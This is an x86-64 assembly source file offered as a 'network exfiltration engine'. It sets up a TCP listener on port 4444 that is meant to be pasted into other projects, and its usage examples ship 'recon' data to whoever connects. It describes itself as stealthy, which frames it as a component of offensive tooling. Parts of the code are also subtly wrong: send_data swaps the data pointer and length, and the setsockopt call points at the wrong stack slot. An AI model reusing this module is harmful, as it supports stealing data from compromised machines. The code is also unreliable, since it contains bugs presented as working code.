; =============================================================================
; NETWORK EXFILTRATION ENGINE - Standalone Network Communication Block
; =============================================================================
; Copy this entire file into any ASM project for instant network capabilities
; 
; Features:
;   - Bind to port and listen for connections
;   - Accept incoming connections  
;   - Send data over socket
;   - Proper cleanup and error handling
;   - Lightweight and stealthy
;
; Usage:
;   1. Include this block in your .asm file
;   2. Add to .data section: listen_port dw 4444
;   3. Add to .bss section: socket_fd resq 1, client_fd resq 1
;   4. Call: call init_network_listener
;   5. Send data: mov rdi, data_ptr ; mov rsi, data_len ; call send_data
;   6. Cleanup: call cleanup_network
; =============================================================================

section .data
    ; Network configuration
    listen_port dw 4444              ; Default port (change as needed)
    
    ; Socket address structure for IPv4
    sockaddr_in:
        dw 2                         ; AF_INET (IPv4)
        dw 0x5C11                    ; Port 4444 in network byte order (big-endian)
        dd 0                         ; INADDR_ANY (0.0.0.0)
        dq 0                         ; Padding
    
    ; Status messages (optional, for debugging)
    msg_listening db '[+] Listening on port 4444...', 10, 0
    msg_connected db '[+] Client connected', 10, 0
    msg_sent db '[+] Data sent', 10, 0
    msg_error db '[-] Network error', 10, 0

section .bss
    ; Network file descriptors
    socket_fd resq 1                 ; Server socket
    client_fd resq 1                 ; Client connection
    
    ; Buffer for network operations
    net_buffer resb 4096

section .text

; =============================================================================
; MAIN NETWORK INTERFACE
; =============================================================================

; Initialize network listener
; Creates socket, binds to port, and starts listening
; Returns: rax = 0 on success, -1 on error
init_network_listener:
    push rbp
    mov rbp, rsp
    
    ; Create socket
    call create_socket
    test rax, rax
    js .error
    mov [socket_fd], rax
    
    ; Bind socket to port
    call bind_socket
    test rax, rax
    js .error
    
    ; Start listening
    call listen_socket
    test rax, rax
    js .error
    
    ; Success
    xor rax, rax
    jmp .done
    
.error:
    mov rax, -1
    
.done:
    mov rsp, rbp
    pop rbp
    ret

; Wait for and accept a client connection
; Returns: rax = client fd on success, -1 on error
accept_connection:
    push rbp
    mov rbp, rsp
    
    ; Accept incoming connection
    mov rax, 43                      ; accept syscall
    mov rdi, [socket_fd]             ; Server socket
    xor rsi, rsi                     ; Don't need client address
    xor rdx, rdx                     ; Don't need address length
    syscall
    
    test rax, rax
    js .error
    
    ; Store client fd
    mov [client_fd], rax
    jmp .done
    
.error:
    mov rax, -1
    
.done:
    mov rsp, rbp
    pop rbp
    ret

; Send data to connected client
; Input: rdi = data pointer, rsi = data length
; Returns: rax = bytes sent on success, -1 on error
send_data:
    push rbp
    mov rbp, rsp
    push rdi
    push rsi
    
    ; Check if we have a client connection
    cmp qword [client_fd], 0
    je .error
    
    ; Send data
    mov rax, 1                       ; write syscall
    mov rdi, [client_fd]             ; Client socket
    mov rsi, [rsp]                   ; Data pointer (from stack)
    mov rdx, [rsp + 8]               ; Data length (from stack)
    syscall
    
    test rax, rax
    js .error
    jmp .done
    
.error:
    mov rax, -1
    
.done:
    add rsp, 16                      ; Clean up stack
    mov rsp, rbp
    pop rbp
    ret

; Send a string (null-terminated)
; Input: rdi = string pointer
; Returns: rax = bytes sent on success, -1 on error
send_string:
    push rbp
    mov rbp, rsp
    push rdi
    
    ; Check if we have a client connection
    cmp qword [client_fd], 0
    je .error
    
    ; Calculate string length
    call strlen
    mov rdx, rax                     ; Length in rdx
    
    ; Send data directly
    mov rax, 1                       ; write syscall
    mov rdi, [client_fd]             ; Client socket
    mov rsi, [rsp]                   ; String pointer
    syscall
    
    test rax, rax
    js .error
    jmp .done
    
.error:
    mov rax, -1
    
.done:
    add rsp, 8
    mov rsp, rbp
    pop rbp
    ret

; Cleanup network resources
cleanup_network:
    push rbp
    mov rbp, rsp
    
    ; Close client socket if open
    cmp qword [client_fd], 0
    je .close_server
    
    mov rax, 3                       ; close syscall
    mov rdi, [client_fd]
    syscall
    mov qword [client_fd], 0
    
.close_server:
    ; Close server socket if open
    cmp qword [socket_fd], 0
    je .done
    
    mov rax, 3                       ; close syscall
    mov rdi, [socket_fd]
    syscall
    mov qword [socket_fd], 0
    
.done:
    mov rsp, rbp
    pop rbp
    ret

; =============================================================================
; INTERNAL SOCKET FUNCTIONS
; =============================================================================

; Create TCP socket
; Returns: rax = socket fd on success, -1 on error
create_socket:
    mov rax, 41                      ; socket syscall
    mov rdi, 2                       ; AF_INET (IPv4)
    mov rsi, 1                       ; SOCK_STREAM (TCP)
    mov rdx, 0                       ; protocol (default)
    syscall
    ret

; Bind socket to address and port
; Returns: rax = 0 on success, -1 on error
bind_socket:
    ; Set SO_REUSEADDR to avoid "Address already in use" errors
    mov rax, 54                      ; setsockopt syscall
    mov rdi, [socket_fd]
    mov rsi, 1                       ; SOL_SOCKET
    mov rdx, 2                       ; SO_REUSEADDR
    mov r10, rsp                     ; Point to stack (we'll put 1 there)
    push 1                           ; Value = 1 (enable)
    mov r8, 4                        ; Size of int
    syscall
    add rsp, 8                       ; Clean up stack
    
    ; Bind socket
    mov rax, 49                      ; bind syscall
    mov rdi, [socket_fd]
    mov rsi, sockaddr_in             ; Address structure
    mov rdx, 16                      ; Address structure size
    syscall
    ret

; Start listening on socket
; Returns: rax = 0 on success, -1 on error
listen_socket:
    mov rax, 50                      ; listen syscall
    mov rdi, [socket_fd]
    mov rsi, 5                       ; Backlog (max pending connections)
    syscall
    ret

; =============================================================================
; UTILITY FUNCTIONS
; =============================================================================

; Calculate string length
; Input: rdi = string pointer
; Returns: rax = string length
strlen:
    push rdi
    xor rax, rax
    
.loop:
    cmp byte [rdi + rax], 0
    je .done
    inc rax
    jmp .loop
    
.done:
    pop rdi
    ret

; Print string to stdout (for debugging)
; Input: rdi = string pointer
print_debug:
    push rbp
    mov rbp, rsp
    push rdi
    
    call strlen
    mov rdx, rax                     ; Length
    mov rax, 1                       ; write syscall
    mov rdi, 1                       ; stdout
    mov rsi, [rsp]                   ; String
    syscall
    
    add rsp, 8
    mov rsp, rbp
    pop rbp
    ret

; =============================================================================
; HIGH-LEVEL CONVENIENCE FUNCTIONS
; =============================================================================

; Complete network setup and wait for connection
; Returns: rax = 0 on success with client connected, -1 on error
setup_and_wait:
    push rbp
    mov rbp, rsp
    
    ; Initialize listener
    call init_network_listener
    test rax, rax
    js .error
    
    ; Wait for client
    call accept_connection
    test rax, rax
    js .error
    
    ; Success
    xor rax, rax
    jmp .done
    
.error:
    call cleanup_network
    mov rax, -1
    
.done:
    mov rsp, rbp
    pop rbp
    ret

; Send data and close connection (one-shot)
; Input: rdi = data pointer, rsi = data length
send_and_close:
    push rbp
    mov rbp, rsp
    
    call send_data
    call cleanup_network
    
    mov rsp, rbp
    pop rbp
    ret

; =============================================================================
; USAGE EXAMPLES AND INTEGRATION PATTERNS:
; =============================================================================
; 
; ; Basic usage - wait for connection and send data:
; section .data
;     my_data db 'Hello from recon tool!', 10, 0
; 
; section .text
; _start:
;     ; Setup network and wait for connection
;     call setup_and_wait
;     test rax, rax
;     js .exit
;     
;     ; Send our data
;     mov rdi, my_data
;     call send_string
;     
;     ; Cleanup
;     call cleanup_network
; 
; .exit:
;     mov rax, 60
;     xor rdi, rdi
;     syscall
;
; ; Advanced usage - send multiple pieces of data:
; _start:
;     call init_network_listener
;     call accept_connection
;     
;     ; Send multiple strings
;     mov rdi, header_msg
;     call send_string
;     
;     mov rdi, recon_data
;     call send_string
;     
;     mov rdi, footer_msg
;     call send_string
;     
;     call cleanup_network
; =============================================================================
